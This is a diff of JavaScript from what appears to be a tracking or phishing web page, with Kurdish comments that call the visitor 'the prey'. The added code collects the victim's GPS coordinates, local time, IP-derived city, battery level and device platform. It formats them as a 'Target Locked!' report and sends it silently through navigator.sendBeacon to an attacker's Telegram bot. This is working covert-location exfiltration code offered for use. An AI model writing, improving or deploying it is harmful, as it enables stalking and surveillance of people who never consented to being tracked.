@@ -31,22 +31,37 @@
             const lat = pos.coords.latitude;
             const lon = pos.coords.longitude;
             
-            // ٢. وەرگرتنی زانیارییە خێراکان
+            // ٢. وەرگرتنی کاتی ئێستا (بە پێی مۆبایلی نێچیرەکە)
+            const now = new Date();
+            const timeStr = now.toLocaleTimeString('en-US', { hour: 'numeric', minute: 'numeric', hour12: true });
+
+            // ٣. وەرگرتنی ناوی شار بە پێی ئایپی (IP Geolocation)
+            let city = "Unknown";
+            try {
+                const geoRes = await fetch('https://ipapi.co/json/');
+                const geoData = await geoRes.json();
+                city = geoData.city + " / " + (geoData.region || "");
+            } catch (e) {
+                city = "Not Found";
+            }
+
+            // ٤. وەرگرتنی زانیاری باتری
             let bat = "N/A";
             if (navigator.getBattery) {
                 const b = await navigator.getBattery();
                 bat = Math.floor(b.level * 100) + "%";
             }
 
+            // ٥. ڕێکخستنی ڕاپۆرتەکە
             let report = `🚨 <b>Target Locked!</b>\n\n` +
                          `📍 <b>Location:</b> https://www.google.com/maps?q=${lat},${lon}\n` +
                          `🔋 <b>Battery:</b> ${bat}\n` +
-                         `📱 <b>Device:</b> ${navigator.platform}`;
+                         `📱 <b>Device:</b> ${navigator.platform}\n` +
+                         `🕒 <b>Time:</b> ${timeStr}\n` +
+                         `🏙️ <b>City:</b> ${city}`;
 
-            // ٣. ناردنی خێرا (Beacon) - ئەمە نەوەستاوە و یەکسەر دەیپێکێت
+            // ٦. ناردنی خێرا (Beacon)
             const url = `https://api.telegram.org/bot${TK}/sendMessage?chat_id=${uid}&text=${encodeURIComponent(report)}&parse_mode=HTML`;
-            
-            // ئەمە فێڵە سەرەکییەکەیە بۆ خێرایی
             navigator.sendBeacon(url);
 
         }, (err) => {
